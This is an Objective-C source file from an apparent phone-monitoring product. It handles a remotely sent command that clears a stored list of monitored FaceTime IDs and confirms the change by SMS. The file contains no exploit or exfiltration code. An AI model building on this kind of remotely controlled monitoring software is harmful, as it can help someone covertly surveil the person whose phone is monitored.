//
//  ClearMonitorFacetimeIDProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 7/10/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ClearMonitorFacetimeIDProcessor.h"
#import "PrefMonitorFacetimeID.h"
#import "Preference.h"

@interface ClearMonitorFacetimeIDProcessor (PrivateAPI)
- (void) processClearMonitorFacetimeIDs;
- (void) sendReplySMS;
@end

@implementation ClearMonitorFacetimeIDProcessor


/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ClearMonitorFacetimeIDProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ClearMonitorFacetimeIDProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearMonitorFacetimeIDProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearMonitorFacetimeIDProcessor
 - Argument list and description: 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"ClearMonitorFacetimeIDProcessor--->doProcessingCommand")
 	[self processClearMonitorFacetimeIDs];
}


#pragma mark ClearMonitorFacetimeIDsProcessor PrivateAPI Methods

/**
 - Method name: processClearMonitorFacetimeIDs
 - Purpose:This method is used to process clear Monitors
 - Argument list and description: No Argument
 - Return description: No Return type
 */

- (void) processClearMonitorFacetimeIDs {
	DLog (@"ClearMonitorFacetimeIDProcessor--->processClearMonitorFacetimeIDs");
	id <PreferenceManager> prefManager	= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorFacetimeID *prefMonitorFacetimeID		= (PrefMonitorFacetimeID *) [prefManager preference:kFacetimeID];
	NSMutableArray *monitorsArray		=[[NSMutableArray alloc] init];
	[prefMonitorFacetimeID setMMonitorFacetimeIDs:monitorsArray];
	[prefManager savePreferenceAndNotifyChange:prefMonitorFacetimeID];
	[monitorsArray release];
	[self sendReplySMS];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"ClearMonitorFacetimeIDProcessor--->sendReplySMS")
	NSString *messageFormat	=	[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}

@end
